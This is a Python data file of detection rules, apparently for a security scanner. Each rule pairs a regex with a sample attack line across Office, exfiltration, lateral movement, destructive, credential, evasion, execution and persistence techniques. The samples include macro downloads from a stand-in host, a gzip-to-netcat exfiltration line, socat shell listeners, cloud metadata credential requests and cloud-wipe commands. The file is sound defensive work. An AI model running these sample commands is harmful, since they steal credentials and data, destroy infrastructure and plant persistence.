"""Batch 5 of technique rows: Office, exfil, lateral, impact, credential,
evasion and execution techniques the first four rounds did not cover."""
from _addrows import append_rows, sweep

ROWS = [
    # ------------------------------------------------------------------ office
    ("IND2-OFFICE-OLE10NATIVE-EXE", "embedded package object runs an exe", "office",
     "high",
     "The Ole10Native stream of an embedded package object points at a dropper.",
     (r"Ole10Native[^\n]{0,80}\.exe",), ("office", "embedded"),
     r"Ole10Native: C:\Users\Public\payload.exe"),

    ("IND2-OFFICE-MACRO-WMI", "macro drives WMI", "office", "high",
     "A macro that builds a SWbemLocator object runs commands through WMI.",
     (r"WbemScripting\.SWbemLocator",), ("office", "wmi"),
     'Set o = CreateObject("WbemScripting.SWbemLocator")'),

    ("IND2-OFFICE-MACRO-DOWNLOAD", "macro downloads a payload", "office", "high",
     "URLDownloadToFile fetches the next stage from a macro.",
     (r"URLDownloadToFile[^\n]{0,60}",), ("office", "download"),
     'URLDownloadToFile 0, "http://evil.example.org/x.exe", "C:\\x.exe", 0, 0'),

    ("IND2-OFFICE-WORD-INCLUDE-FIELD", "remote content in a Word field", "office",
     "medium",
     "INCLUDEPICTURE/INCLUDETEXT fields pull remote content without macros.",
     (r"INCLUDE(?:PICTURE|TEXT)[^\n]{0,60}https?://",), ("office", "field"),
     'INCLUDEPICTURE "http://evil.example.org/x.jpg"'),

    ("IND2-OFFICE-OUTLOOK-VBA", "Outlook VBA project present", "office", "high",
     "VbaProject.OTM is macro persistence inside the mail client.",
     (r"VbaProject\.OTM",), ("office", "outlook"),
     r"C:\Users\me\AppData\Roaming\Microsoft\Outlook\VbaProject.OTM"),

    ("IND2-OFFICE-XLM-CALL-KERNEL32", "Excel 4.0 CALL to kernel32", "office", "high",
     'XLM =CALL("Kernel32",...) reaches Win32 APIs from a formula.',
     (r"CALL\s*\(\s*\"Kernel32\"",), ("office", "xlm"),
     '=CALL("Kernel32","CreateThread","JJJJC","0","0","0","0")'),

    ("IND2-OFFICE-XXE-ENTITY", "OOXML external entity", "office", "high",
     "An XML external entity in an Office part reads local files or calls out.",
     (r"<!ENTITY[^\n]{0,40}SYSTEM[^\n]{0,20}(?:file://|https?://)",), ("office", "xxe"),
     '<!ENTITY xxe SYSTEM "file:///etc/passwd">'),

    ("IND2-OFFICE-MACRO-REG-PERSIST", "macro writes a run key", "office", "high",
     "RegWrite to CurrentVersion\\Run survives the document closing.",
     (r"RegWrite[^\n]{0,60}(?:CurrentVersion\\\\Run|RunOnce)",), ("office", "registry"),
     r'RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\evil", "C:\evil.exe"'),

    # ------------------------------------------------------------------- exfil
    ("IND2-EXFIL-ICMP-TUNNEL", "ICMP tunnel tool", "exfil", "high",
     "ptunnel/icmpsh/hans carry a shell over ping packets.",
     (r"\b(?:ptunnel|icmpsh|icmptunnel|hans)\b[^\n]{0,60}",), ("tunnel", "icmp"),
     "ptunnel -p 10.0.0.9 -lp 8080 -da evil.example.org"),

    ("IND2-EXFIL-SSH-REVERSE-TUNNEL", "ssh reverse tunnel", "exfil", "high",
     "ssh -R exposes an internal service through an outbound connection.",
     (r"ssh[^\n]{0,60}-R\s+\d+:",), ("ssh", "tunnel"),
     "ssh -R 4444:localhost:22 user@10.0.0.9"),

    ("IND2-EXFIL-SOCAT-RELAY", "socat relays a shell", "exfil", "high",
     "socat bridges a socket to a process, the classic listener one-liner.",
     (r"socat[^\n]{0,60}(?:TCP|EXEC)",), ("tunnel", "shell"),
     "socat TCP-LISTEN:4444 EXEC:/bin/bash"),

    ("IND2-EXFIL-TELEGRAM-BOT-TOKEN", "telegram bot token literal", "exfil", "high",
     "A bot token lets a script read commands and upload stolen files.",
     (r"\b\d{8,10}:[A-Za-z0-9_-]{35}\b",), ("token", "telegram"),
     "bot_token=1234567890:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw"),

    ("IND2-EXFIL-ARCHIVE-PIPE-NC", "archived data piped to a socket", "exfil", "high",
     "Compressing a directory and piping it into netcat is staging plus transfer.",
     (r"(?:gzip|xz|bzip2)[^\n]{0,100}(?:nc|ncat|socat|/dev/tcp)",), ("exfil", "archive"),
     "gzip -c /var/lib/pg/data | nc drop.evil.example.org 4444"),

    ("IND2-EXFIL-DROPZONE", "public drop service", "exfil", "medium",
     "Anonymous file hosts are used to park stolen data outside the network.",
     (r"(?:0x0\.st|gofile\.io|uguu\.se|anonfiles\.com|transfer\.sh)",), ("exfil", "drop"),
     "UPLOAD_URL=https://0x0.st/"),

    # ----------------------------------------------------------------- lateral
    ("IND2-LATERAL-RDP-SHADOW", "RDP session shadowed", "lateral", "high",
     "mstsc /shadow watches or takes over another user's desktop session.",
     (r"mstsc[^\n]{0,80}/shadow:",), ("rdp", "lateral"),
     "mstsc /v:10.0.0.9 /shadow:1 /control"),

    ("IND2-LATERAL-RDP-ENABLE", "RDP enabled by registry", "lateral", "high",
     "fDenyTSConnections=0 turns the remote desktop listener on.",
     (r"fDenyTSConnections[^\n]{0,40}0",), ("rdp", "lateral"),
     r'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /d 0'),

    ("IND2-LATERAL-WINRM-ENABLE", "WinRM enabled", "lateral", "medium",
     "Enable-PSRemoting opens the remote management endpoint on the host.",
     (r"Enable-PSRemoting[^\n]{0,40}",), ("winrm", "lateral"),
     "Enable-PSRemoting -Force"),

    ("IND2-LATERAL-SSH-COPY-ID", "ssh key pushed to a remote account", "lateral",
     "high",
     "ssh-copy-id installs a key on the target, giving the attacker logins.",
     (r"ssh-copy-id[^\n]{0,60}",), ("ssh", "lateral"),
     "ssh-copy-id -i ~/.ssh/id_rsa.pub admin@10.0.0.9"),

    ("IND2-LATERAL-NETEXEC", "netexec/crackmapexec sweep", "lateral", "high",
     "NetExec-style tools authenticate across hosts and enumerate shares.",
     (r"\b(?:nxc|netexec|crackmapexec|cme)\b[^\n]{0,60}(?:smb|winrm|ldap|mssql)",),
     ("lateral", "tool"),
     "nxc smb 10.0.0.9 -u admin -p pass --shares"),

    ("IND2-LATERAL-HYDRA", "hydra credential attack", "lateral", "high",
     "Hydra brute-forces ssh/rdp/smb logins from a wordlist.",
     (r"hydra[^\n]{0,60}(?:ssh|rdp|smb|ftp)",), ("bruteforce", "lateral"),
     "hydra -L users.txt -P pass.txt ssh://10.0.0.9"),

    ("IND2-LATERAL-KERBRUTE", "kerbrute enumeration", "lateral", "high",
     "kerbrute userenum/passwordspray queries the KDC directly.",
     (r"kerbrute[^\n]{0,60}(?:userenum|passwordspray|bruteuser)",), ("kerberos", "lateral"),
     "kerbrute userenum --dc 10.0.0.9 -d corp.local users.txt"),

    ("IND2-LATERAL-RESPDER", "relay/poisoning toolkit", "lateral", "high",
     "Responder, ntlmrelayx and mitm6 capture or relay NTLM authentication.",
     (r"\b(?:ntlmrelayx|Responder\.py|mitm6)\b",), ("ntlm", "lateral"),
     "ntlmrelayx.py -tf targets.txt -smb2support"),

    # ------------------------------------------------------------------ impact
    ("IND2-IMPACT-AZURE-DELETE", "Azure resource deleted", "impact", "critical",
     "az group/vm/disk delete destroys cloud infrastructure from the CLI.",
     (r"az\s+(?:group|vm|disk|storage\s+account)\s+delete",), ("cloud", "destructive"),
     "az group delete --name prod --yes"),

    ("IND2-IMPACT-GCS-BUCKET-WIPE", "GCS bucket emptied", "impact", "critical",
     "gsutil rm -r deletes a bucket's contents, backups included.",
     (r"gsutil\s+rm\s+-r[^\n]{0,60}gs://",), ("cloud", "destructive"),
     "gsutil rm -r gs://prod-backups/**"),

    ("IND2-IMPACT-K8S-NAMESPACE-DELETE", "kubernetes namespace deleted", "impact",
     "critical",
     "kubectl delete namespace --force removes a whole workload at once.",
     (r"kubectl\s+delete\s+(?:ns|namespace)\b",), ("kubernetes", "destructive"),
     "kubectl delete namespace prod --force --grace-period=0"),

    ("IND2-IMPACT-DOCKER-VOLUME-RM", "docker volume removed", "impact", "high",
     "docker volume rm deletes persistent data that no container can restore.",
     (r"docker\s+volume\s+rm\b",), ("docker", "destructive"),
     "docker volume rm -f pgdata"),

    ("IND2-IMPACT-RSYNC-DELETE", "rsync mirror deletes the target", "impact", "high",
     "rsync --delete from an empty source wipes the destination tree.",
     (r"rsync[^\n]{0,60}--delete[^\n]{0,60}/dev/null|rsync[^\n]{0,40}--delete\s+\S*empty",
      ), ("destructive", "backup"),
     "rsync -a --delete --exclude=keep /dev/null /mnt/backup/"),

    # --------------------------------------------------------------- credential
    ("IND2-CRED-NTDS-DIT-COPY", "AD database copied", "credential", "critical",
     "Copying ntds.dit takes every domain password hash with it.",
     (r"(?:NTDS|ntds)\.dit\b[^\n]{0,60}",), ("active-directory", "credential"),
     r"copy C:\Windows\NTDS\ntds.dit C:\temp\ntds.dit"),

    ("IND2-CRED-IMDS-ROLE-CREDS", "AWS instance role credentials requested",
     "credential", "critical",
     "The EC2 metadata service hands out the instance role's keys to anyone local.",
     (r"169\.254\.169\.254/latest/meta-data/iam/security-credentials",), ("cloud", "aws"),
     "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role"),

    ("IND2-CRED-IMDS-IDENTITY-TOKEN", "managed identity token requested",
     "credential", "high",
     "The Azure IMDS endpoint issues an access token for the attached identity.",
     (r"169\.254\.169\.254/metadata/identity/oauth2/token",), ("cloud", "azure"),
     'curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01" -H Metadata:true'),

    ("IND2-CRED-CISCO-TYPE7", "network config with reversible password",
     "credential", "high",
     "Cisco type-7 passwords are trivially decodable from a grabbed config.",
     (r"password\s+7\s+[0-9A-Fa-f]{4,}",), ("network", "credential"),
     "username admin password 7 070C285F4D06"),

    ("IND2-CRED-SQL-WINDOWS-AUTH", "database connection with integrated auth",
     "credential", "medium",
     "A connection string using the service account reaches the database as that account.",
     (r"(?:Integrated Security|Trusted_Connection)=[Tt]rue[^\n]{0,60}",), ("database", "credential"),
     'conn = "Server=db01;Database=prod;Integrated Security=True;"'),

    # ----------------------------------------------------------------- evasion
    ("IND2-EVADE-DRIVER-SIGNATURE-OFF", "driver signature enforcement loosened",
     "evasion", "critical",
     "testsigning/nointegritychecks let an unsigned kernel driver load.",
     (r"bcdedit[^\n]{0,60}(?:testsigning\s+on|nointegritychecks\s+on)",), ("bcdedit", "driver"),
     "bcdedit /set nointegritychecks on"),

    ("IND2-EVADE-CREDENTIAL-GUARD-OFF", "Credential Guard disabled", "evasion", "high",
     "LsaCfgFlags=0 turns off the virtualisation-based credential isolation.",
     (r"LsaCfgFlags[^\n]{0,40}0",), ("defender", "credential"),
     r"reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LsaCfgFlags /d 0"),

    ("IND2-EVADE-ETW-SESSION-STOP", "ETW session stopped", "evasion", "high",
     "logman stop tears down the session a monitoring agent feeds on.",
     (r"logman[^\n]{0,60}stop[^\n]{0,60}(?:EventLog|Sysmon|Threat|Telemetry)",),
     ("etw", "telemetry"),
     "logman stop Sysmon -ets"),

    # --------------------------------------------------------------- execution
    ("IND2-EXEC-HH-CHM", "hh.exe decompiles a CHM", "execution", "high",
     "hh.exe executes or extracts HTML help files, a signed-binary proxy.",
     (r"hh(?:\.exe)?[^\n]{0,40}(?:\.chm|decompile)",), ("lolbin", "windows"),
     r"hh.exe -decompile C:\temp evil.chm"),

    ("IND2-EXEC-CONHOST-HEADLESS", "conhost headless execution", "execution", "high",
     "conhost.exe with --headless runs a process without a visible console.",
     (r"conhost(?:\.exe)?[^\n]{0,40}--headless",), ("lolbin", "windows"),
     "conhost.exe --headless cmd.exe"),

    ("IND2-EXEC-TSCON-SESSION-HIJACK", "RDP session hijack", "execution", "high",
     "tscon redirects another session to the current one, taking it over.",
     (r"tscon[^\n]{0,60}(?:/dest:|rdp-tcp)",), ("rdp", "lateral"),
     "tscon 3 /dest:rdp-tcp#5"),

    ("IND2-EXEC-GDB-CALL", "gdb executes inside a process", "execution", "high",
     "gdb -p ... -ex call runs code in a live process on Linux.",
     (r"gdb[^\n]{0,60}-p\s*\d+[^\n]{0,60}call",), ("linux", "injection"),
     'gdb -p 1234 -batch -ex "call (void)system(\\"id\\")"'),

    ("IND2-EXEC-PTRACE-ATTACH", "ptrace attach", "execution", "high",
     "PTRACE_ATTACH takes control of another process, the base of Linux injection.",
     (r"ptrace[^\n]{0,40}PTRACE_ATTACH",), ("linux", "injection"),
     "ptrace(PTRACE_ATTACH, pid, NULL, NULL)"),

    ("IND2-EXEC-EBPF-PROGRAM", "eBPF program loaded", "execution", "critical",
     "An eBPF probe in the kernel hides files or intercepts syscalls.",
     (r"(?:BPF_PROG_LOAD|SEC\(\"(?:kprobe|tracepoint)/)",), ("linux", "rootkit"),
     'SEC("kprobe/do_sys_open")'),

    ("IND2-EXEC-SYSTEMD-RUN", "systemd-run transient unit", "execution", "medium",
     "systemd-run creates a temporary unit, running a command outside the shell.",
     (r"systemd-run[^\n]{0,60}",), ("linux", "systemd"),
     "systemd-run --unit=evil /tmp/x"),

    ("IND2-EXEC-DOTNET-FSI", "F# interactive script", "execution", "medium",
     "dotnet fsi executes a script through the .NET SDK.",
     (r"(?:dotnet\s+fsi|fsi(?:\.exe)?)[^\n]{0,40}\.fsx\b",), ("dotnet", "script"),
     "dotnet fsi /tmp/evil.fsx"),

    # ------------------------------------------------------------- persistence
    ("IND2-PERSIST-DOCKER-RUNTIME", "docker runtime added", "persistence", "critical",
     "A custom runtime path in daemon.json wraps every container start.",
     (r"\"runtimes\"[^\n]{0,80}\"path\"",), ("docker", "daemon"),
     '{"runtimes": {"evil": {"path": "/usr/bin/evil"}}}'),

    ("IND2-PERSIST-VSCODE-EXTENSION", "VS Code extension installed", "persistence",
     "high",
     "An extension directory under ~/.vscode runs code whenever the editor opens.",
     (r"\.vscode/extensions/[A-Za-z0-9._-]{2,}",), ("ide", "extension"),
     "cp -r evil ~/.vscode/extensions/evil.publisher-1.0.0"),

    ("IND2-PERSIST-JUPYTER-STARTUP", "Jupyter startup hook", "persistence", "high",
     "Everything in ~/.jupyter/startup runs for every notebook server.",
     (r"\.jupyter/(?:startup|jupyter_notebook_config)",), ("python", "ide"),
     "cp evil.py ~/.jupyter/startup/00-evil.py"),

    ("IND2-PERSIST-SPOOL-CRON", "user crontab file written directly", "persistence",
     "high",
     "Writing /var/spool/cron/<user> adds a job without using crontab.",
     (r"/var/spool/cron/[A-Za-z0-9_.-]{1,32}",), ("linux", "scheduler"),
     "echo '* * * * * /tmp/x' >> /var/spool/cron/root"),

    ("IND2-PERSIST-GITHUB-ACTIONS", "GitHub Actions workflow added", "persistence",
     "high",
     "A workflow file runs on every push, using the repository's CI runner.",
     (r"\.github/workflows/[A-Za-z0-9._-]{2,}\.ya?ml",), ("ci", "github"),
     "cp evil.yml .github/workflows/build.yml"),
]

if __name__ == "__main__":
    append_rows(ROWS)
    sweep()
